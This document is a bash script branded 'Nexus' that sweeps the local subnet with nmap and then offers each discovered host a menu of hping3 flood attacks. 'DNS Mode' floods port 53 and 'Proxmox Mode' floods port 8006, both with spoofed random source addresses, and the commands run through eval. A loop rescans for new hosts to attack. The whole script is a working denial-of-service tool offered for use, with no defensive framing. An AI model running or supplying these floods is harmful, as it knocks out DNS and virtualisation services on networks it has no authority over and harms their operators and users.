#!/bin/bash

# ==========================
# Nexus ASCII Art Banner
# ==========================
echo "███╗░░██╗███████╗██╗░░██╗██╗░░░██╗░██████╗"
echo "████╗░██║██╔════╝╚██╗██╔╝██║░░░██║██╔════╝"
echo "██╔██╗██║█████╗░░░╚███╔╝░██║░░░██║╚█████╗░"
echo "██║╚████║██╔══╝░░░██╔██╗░██║░░░██║░╚═══██╗"
echo "██║░╚███║███████╗██╔╝╚██╗╚██████╔╝██████╔╝"
echo "╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═════╝░"
echo
sleep 1

# ==========================
# Detect network interface and subnet
# ==========================
INTERFACE=$(ip route | grep '^default' | awk '{print $5}')
NETWORK=$(ip -o -f inet addr show $INTERFACE | awk '{print $4}')
echo "[*] Detected interface: $INTERFACE"
echo "[*] Detected network: $NETWORK"
sleep 1

# ==========================
# Automatic Ping Sweep
# ==========================
echo "[*] Performing automatic network discovery on $NETWORK..."
HOSTS=$(nmap -sn $NETWORK | grep "Nmap scan report for" | awk '{print $5}')
echo "[*] Hosts discovered:"
echo "$HOSTS"
sleep 1

# ==========================
# DNS & Proxmox Attacks
# ==========================
dns_attacks=(
"hping3 --udp --flood -V --rand-source -d 1400 -p 53"
"hping3 -S --flood -V -p 53 --rand-source -d 1400"
"hping3 --icmp --flood --rand-source -d 1400"
"hping3 -S --flood -V -p 53 -f --rand-source -d 1400"
"hping3 -F -S -R -P -A -U --flood -V --rand-source -p 53"
)

proxmox_attacks=(
"hping3 -S --flood -V -p 8006 -f --rand-source -d 1400"
"hping3 -S --flood -V -p 8006 --rand-source -d 1400"
"hping3 -F -S -R -P -A -U --flood -V --rand-source -p 8006"
"hping3 -A -F --flood --rand-source -p 8006 -d 1200"
"hping3 --icmp --flood --rand-source -d 1400"
)

attack_host() {
    local HOST=$1
    echo
    echo "[*] Host: $HOST detected."
    echo "Select attack mode:"
    echo "1) DNS Mode"
    echo "2) Proxmox Mode"
    read -p "Choice: " MODE

    if [ "$MODE" == "1" ]; then
        echo "[*] DNS Mode selected."
        for ATTACK in "${dns_attacks[@]}"; do
            echo
            echo "[*] Ready to execute: $ATTACK $HOST"
            read -p "Run this attack? (y/n): " RUN
            if [[ "$RUN" =~ ^[Yy]$ ]]; then
                eval "$ATTACK $HOST"
            fi
        done
    elif [ "$MODE" == "2" ]; then
        echo "[*] Proxmox Mode selected."
        for ATTACK in "${proxmox_attacks[@]}"; do
            echo
            echo "[*] Ready to execute: $ATTACK $HOST"
            read -p "Run this attack? (y/n): " RUN
            if [[ "$RUN" =~ ^[Yy]$ ]]; then
                eval "$ATTACK $HOST"
            fi
        done
    else
        echo "Invalid choice, skipping host $HOST."
    fi
}

# ==========================
# Iterate over discovered hosts
# ==========================
for HOST in $HOSTS; do
    attack_host $HOST
done

# ==========================
# Optionally scan new hosts
# ==========================
while true; do
    echo
    read -p "Scan for new hosts? (y/n): " NEWSCAN
    if [[ "$NEWSCAN" =~ ^[Yy]$ ]]; then
        NEW_HOSTS=$(nmap -sn $NETWORK | grep "Nmap scan report for" | awk '{print $5}')
        for HOST in $NEW_HOSTS; do
            if ! echo "$HOSTS" | grep -q "$HOST"; then
                echo "[*] New host discovered: $HOST"
                HOSTS="$HOSTS $HOST"
                attack_host $HOST
            fi
        done
    else
        echo "Exiting..."
        exit 0
    fi
done
